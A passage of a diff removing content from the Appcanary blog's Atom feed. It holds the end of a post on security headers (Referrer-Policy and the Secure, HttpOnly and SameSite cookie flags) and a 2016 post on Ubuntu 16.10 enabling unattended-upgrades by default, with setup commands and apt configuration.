-&lt;p&gt;Set &lt;code&gt;Referrer-Policy: &amp;quot;no-referrer&amp;quot;&lt;/code&gt;&lt;/p&gt;
-
-&lt;h3 id="referrer-policy/how"&gt;How?&lt;/h3&gt;
-
-&lt;table&gt;&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;Platform&lt;/th&gt;
-&lt;th&gt;What do I do?&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;Rails 4 and 5&lt;/td&gt;
-&lt;td&gt;Use &lt;a href="https://github.com/twitter/secureheaders"&gt;secureheaders&lt;/a&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Django&lt;/td&gt;
-&lt;td&gt;Write custom middleware&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Express.js&lt;/td&gt;
-&lt;td&gt;Use &lt;a href="https://helmetjs.github.io/docs/referrer-policy/"&gt;helmet&lt;/a&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Go&lt;/td&gt;
-&lt;td&gt;Write custom middleware&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Nginx&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;add_header Referrer-Policy &amp;quot;no-referrer&amp;quot;;&lt;/code&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Apache&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;Header always set Referrer-Policy &amp;quot;no-referrer&amp;quot;&lt;/code&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Varnish&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;set resp.http.Referrer-Policy = &amp;quot;no-referrer&amp;quot;;&lt;/code&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;&lt;/table&gt;
-
-&lt;h3 id="referrer-policy/more"&gt;I want to know more&lt;/h3&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy"&gt;Referrer Policy - MDN&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;hr&gt;
-
-&lt;h2 id="cookie-options"&gt;Cookie Options&lt;/h2&gt;
-&lt;pre class="highlight plaintext"&gt;&lt;code&gt;Set-Cookie: &amp;lt;key&amp;gt;=&amp;lt;value&amp;gt;; Expires=&amp;lt;expiryDate&amp;gt;; Secure; HttpOnly; SameSite=strict
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id="cookie-options/why"&gt;Why?&lt;/h3&gt;
-
-&lt;p&gt;This isn&amp;rsquo;t a security header per se, but there are three different options for
-cookies that you should be aware of.&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;Cookies marked as &lt;code&gt;Secure&lt;/code&gt; will only be served over HTTPS. This prevents
-someone from reading the cookies in a MiTM attack where they can force the
-browser to visit a given page.&lt;/p&gt;&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;&lt;code&gt;HttpOnly&lt;/code&gt; is a misnomer, and has nothing to do with HTTPS (unlike &lt;code&gt;Secure&lt;/code&gt;
-above). Cookies marked as &lt;code&gt;HttpOnly&lt;/code&gt; can not be accessed from within
-javascript. So if there is an XSS flaw, the attacker can&amp;rsquo;t immediately steal
-the cookies.&lt;/p&gt;&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;&lt;code&gt;SameSite&lt;/code&gt; helps defend against Cross-Origin Request Forgery (CSRF) attacks.
-This is an attack where a different website the user may be visiting
-inadvertently tricks them into making a request against your site, i.e. by
-including an image to make a GET request, or using javascript to submit a form
-for a POST request. Generally, people defend against this
-using
-&lt;a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet"&gt;CSRF tokens&lt;/a&gt;.
-A cookie marked as &lt;code&gt;SameSite&lt;/code&gt; won&amp;rsquo;t be sent to a different site.&lt;/p&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;It has two modes, lax and strict. Lax mode allows the cookie to be sent in a
-  top-level context for GET requests (i.e. if you clicked a link). Strict
-  doesn&amp;rsquo;t send any third-party cookies.&lt;/p&gt;
-
-&lt;h3 id="cookie-options/should"&gt;Should I use it?&lt;/h3&gt;
-
-&lt;p&gt;You should absolutely set &lt;code&gt;Secure&lt;/code&gt; and &lt;code&gt;HttpOnly&lt;/code&gt;. Unfortunately, as of writing,
-SameSite cookies are &lt;a href="http://caniuse.com/#search=samesite"&gt;available&lt;/a&gt; only in
-Chrome and Opera, so you may want to ignore them for now.&lt;/p&gt;
-
-&lt;h3 id="cookie-options/how"&gt;How?&lt;/h3&gt;
-
-&lt;table&gt;&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;Platform&lt;/th&gt;
-&lt;th&gt;What do I do?&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;Rails 4 and 5&lt;/td&gt;
-&lt;td&gt;Secure and HttpOnly enabled by default. For SameSite, use &lt;a href="https://github.com/twitter/secureheaders"&gt;secureheaders&lt;/a&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Django&lt;/td&gt;
-&lt;td&gt;Session cookies are HttpOnly by default. To set secure: &lt;code&gt;SESSION_COOKIE_SECURE = True&lt;/code&gt;. &lt;br/&gt;&lt;br/&gt; Not sure about SameSite.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Express.js&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;cookie: { secure: true, httpOnly: true, sameSite: true }&lt;/code&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Go&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;http.Cookie{Name: &amp;quot;foo&amp;quot;, Value: &amp;quot;bar&amp;quot;, HttpOnly: true, Secure: true}&lt;/code&gt; &lt;br/&gt;&lt;br/&gt; For SameSite, see this &lt;a href="https://github.com/golang/go/issues/15867"&gt;issue&lt;/a&gt;.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Nginx&lt;/td&gt;
-&lt;td&gt;You probably won&amp;rsquo;t set session cookies in Nginx&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Apache&lt;/td&gt;
-&lt;td&gt;You probably won&amp;rsquo;t set session cookies in Apache&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;&lt;/table&gt;
-
-&lt;h3 id="cookie-options/more"&gt;I want to know more&lt;/h3&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies"&gt;Cookies - MDN&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;hr&gt;
-
-&lt;p&gt;Thanks to &lt;a href="https://twitter.com/wolever"&gt;@wolever&lt;/a&gt; for python advice.&lt;/p&gt;
-
-&lt;p&gt;Thanks to &lt;a href="https://twitter.com/therealgquintar"&gt;Guillaume Quintard&lt;/a&gt; for Varnish comands.&lt;/p&gt;
-
-&lt;div class="footnotes"&gt;
-&lt;hr&gt;
-&lt;ol&gt;
-
-&lt;li id="fn1"&gt;
-&lt;p&gt;This is opposed to &amp;ldquo;stored&amp;rdquo; XSS attacks, where the attacker is storing
-the malicious payload somehow, i.e. in a vulnerable comment field of a
-message board.&amp;nbsp;&lt;a href="#fnref1" rev="footnote"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
-&lt;/li&gt;
-
-&lt;li id="fn2"&gt;
-&lt;p&gt;If you&amp;rsquo;re going to point out in the Hacker News comments that
-this blog itself gets an F from the Mozilla observatory, you&amp;rsquo;re right! On
-the other hand, it&amp;rsquo;s serving static content, and we are comfortable avoiding
-XSS protection and strict SSL enforcement for static content. That, and it&amp;rsquo;s
-served by github pages/cloudflare, so it&amp;rsquo;s hard to get very granular about
-the headers we want set.&amp;nbsp;&lt;a href="#fnref2" rev="footnote"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
-&lt;/li&gt;
-
-&lt;li id="fn3"&gt;
-&lt;p&gt;So if you&amp;rsquo;re especially paranoid, you might be thinking &amp;ldquo;what if I
-had some secret subdomain that I don&amp;rsquo;t want leaking for some reason?&amp;rdquo; You have
-DNS zone transfers disabled, so someone would have to know what they&amp;rsquo;re looking
-for to find it, but now that it&amp;rsquo;s in the preload list&amp;hellip;&amp;nbsp;&lt;a href="#fnref3" rev="footnote"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
-&lt;/li&gt;
-
-&lt;li id="fn4"&gt;
-&lt;p&gt;The &lt;code&gt;Referer&lt;/code&gt; header is
-the &lt;a href="http://www.hamsterdance.org/hamsterdance/"&gt;Hampster Dance&lt;/a&gt; in that it&amp;rsquo;s
-notorious for being misspelled. It would break the web to try to backport
-the correct spelling, so instead the W3C decided to go for the worst of both
-worlds and spell it correctly in &lt;code&gt;Referrer-Policy&lt;/code&gt;.&amp;nbsp;&lt;a href="#fnref4" rev="footnote"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
-&lt;/li&gt;
-
-&lt;/ol&gt;
-&lt;/div&gt;
-</content>
-  </entry>
-  <entry>
-    <title>Good News: Ubuntu Now Ships With unattended-upgrades On By Default!</title>
-    <link rel="alternate" href="https://blog.appcanary.com/2016/unattended-upgrades.html"/>
-    <id>https://blog.appcanary.com/2016/unattended-upgrades.html</id>
-    <published>2016-11-14T16:00:00-08:00</published>
-    <updated>2017-05-16T12:08:44-07:00</updated>
-    <author>
-      <name>Max Veytsman</name>
-    </author>
-    <content type="html">&lt;p&gt;Last week, we got a strange support request. One of our users had received the following notification:&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;Hey! Good job.&lt;/p&gt;
-
-&lt;p&gt;We&amp;rsquo;ve detected that you patched some vulnerabilities.&lt;/p&gt;
-
-&lt;p&gt;Here&amp;rsquo;s what changed:&lt;/p&gt;
-
-&lt;p&gt;&lt;a href="https://appcanary.com/vulns/46220"&gt;CVE-2016-8704&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;is no longer present in:&lt;/p&gt;
-
-&lt;p&gt;[name of server redacted]&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;This came as a surprise, since they knew for a fact that no one had touched the package in
-question, and they were certain they had not enabled unattended upgrades. &lt;/p&gt;
-
-&lt;p&gt;Somehow, the vulnerability magically got patched and they wanted to
-know: what&amp;rsquo;s going on?&lt;/p&gt;
-
-&lt;p&gt;The vuln is a pretty serious remote code execution vulnerability in &lt;code&gt;memcached&lt;/code&gt;,
-and as far as we could tell our user was indeed using the most recent version available for their
-distribution &amp;mdash; &lt;code&gt;1.4.25-2ubuntu2.1&lt;/code&gt;. This version was released on November 3rd, and we could see from our logs that
-&lt;code&gt;memcached&lt;/code&gt; got upgraded that same day.&lt;/p&gt;
-
-&lt;p&gt;How did it happen without them knowing about it? The only thing unique about
-their configuration was that they&amp;rsquo;re running the recently released Ubuntu 16.10 (Yakkety
-Yak)&lt;sup id="fnref1"&gt;&lt;a href="#fn1" rel="footnote"&gt;1&lt;/a&gt;&lt;/sup&gt;. &lt;/p&gt;
-
-&lt;p&gt;We dug around, and set up some test Yakkety boxes, and
-lo and behold: unattended upgrades is automatically enabled by default!&lt;/p&gt;
-
-&lt;p&gt;For those of you who are unaware, &lt;code&gt;unattended-upgrades&lt;/code&gt; is a debian/ubuntu package that, well, does what it says on the
-tin: it automatically upgrades your packages. The most common configuration, and the one enabled in 16.10, is to upgrade any packages that have a published security patch. Unattended upgrades does this by checking and installing any
-updates from the &lt;code&gt;${distro_codename}-security&lt;/code&gt; repository.&lt;/p&gt;
-
-&lt;p&gt;Ubuntu/debian has had this for years, but it simply was never turned on by
-default. After a year of many
-&lt;a href="https://blog.appcanary.com/2016/vikhal-symantec.html"&gt;security&lt;/a&gt;
-&lt;a href="https://blog.appcanary.com/2016/mirai-botnet-security-broken.html"&gt;fails&lt;/a&gt;, this
-news warmed the cockles of my heart and gave me hope for our future! And what&amp;rsquo;s
-even amazing is that they turned it on without any fanfare. &lt;/p&gt;
-
-&lt;p&gt;It&amp;rsquo;s the quiet,
-simple changes that provide the biggest wins.&lt;/p&gt;
-
-&lt;p&gt;Of course, there are reasons why administrators don&amp;rsquo;t always want software to be upgraded without
-their input. And if it does get updated, there are good reasons for knowing exactly what vulnerabilities are being patched when.
-&lt;a href="https://appcanary.com/?utm_source=blog&amp;amp;utm_medium=web&amp;amp;utm_campaign=unattended"&gt;Appcanary&lt;/a&gt; exists in order to allow you to be notified
-about security updates without automatically installing them, and to have
-insight into what&amp;rsquo;s going being installed if you are patching automatically.&lt;/p&gt;
-
-&lt;p&gt;But if you don&amp;rsquo;t have the capacity to actively manage the packages on your
-linux systems (and even if you do!), we implore you: set up &lt;code&gt;unattended-upgrades&lt;/code&gt;!&lt;/p&gt;
-
-&lt;p&gt;Ubuntu enabling this by default is a great sign for the future.&lt;/p&gt;
-
-&lt;h2 id="not-running-ubuntu-16-10"&gt;Not running Ubuntu 16.10?&lt;/h2&gt;
-
-&lt;p&gt;Here&amp;rsquo;s how to turn on unattended upgrades&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Ansible: &lt;a href="https://galaxy.ansible.com/jnv/unattended-upgrades/"&gt;jnv.unattended-upgrades&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;Puppet: &lt;a href="https://forge.puppet.com/puppet/unattended_upgrades"&gt;puppet/unattended_upgrades&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;Chef: &lt;a href="https://supermarket.chef.io/cookbooks/apt"&gt;apt&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;If you&amp;rsquo;re using the server interactively: &lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;sudo apt-get install unattended-upgrades &amp;amp;&amp;amp; sudo dpkg-reconfigure unattended-upgrades&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;Set up manually: &lt;code&gt;sudo apt-get install unattended-upgrades&lt;/code&gt; and&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;In &lt;code&gt;/etc/apt/apt.conf.d/20auto-upgrades&lt;/code&gt;:&lt;/p&gt;
-&lt;pre class="highlight plaintext"&gt;&lt;code&gt;APT::Periodic::Update-Package-Lists "1";
-APT::Periodic::Unattended-Upgrade "1";
-&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;In &lt;code&gt;/etc/apt/apt.conf.d/50unattended-upgrades&lt;/code&gt;&lt;/p&gt;
-&lt;pre class="highlight plaintext"&gt;&lt;code&gt;// Automatically upgrade packages from these (origin, archive) pairs
-Unattended-Upgrade::Allowed-Origins {    
-// ${distro_id} and ${distro_codename} will be automatically expanded
-    "${distro_id} ${distro_codename}-security";
-};
-
-// Send email to this address for problems or packages upgrades
-// If empty or unset then no email is sent, make sure that you 
-// have a working mail setup on your system. The package 'mailx'
-// must be installed or anything that provides /usr/bin/mail.
-//Unattended-Upgrade::Mail "root@localhost";
-
-// Do automatic removal of new unused dependencies after the upgrade
-// (equivalent to apt-get autoremove)
-//Unattended-Upgrade::Remove-Unused-Dependencies "false";
-
-// Automatically reboot *WITHOUT CONFIRMATION* if a 
-// the file /var/run/reboot-required is found after the upgrade 
-//Unattended-Upgrade::Automatic-Reboot "false";
-&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;div class="footnotes"&gt;
-&lt;hr&gt;
-&lt;ol&gt;
-
-&lt;li id="fn1"&gt;
-&lt;p&gt;16.10 is not a Long Term Support release. Regular Ubuntu releases
-are supported for 9 months, while April releases on even years (i.e. 14.04,
-16.04, etc&amp;hellip;) are designated LTS, and are supported for 5 years. It&amp;rsquo;s thus
-more common to see 12.04, 14.04, and 16.04 in use on servers over other
-Ubuntu releases. This particular user has a good reason for running 16.10.&amp;nbsp;&lt;a href="#fnref1" rev="footnote"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
-&lt;/li&gt;
-
-&lt;/ol&gt;
-&lt;/div&gt;
 </content>
   </entry>
 </feed>
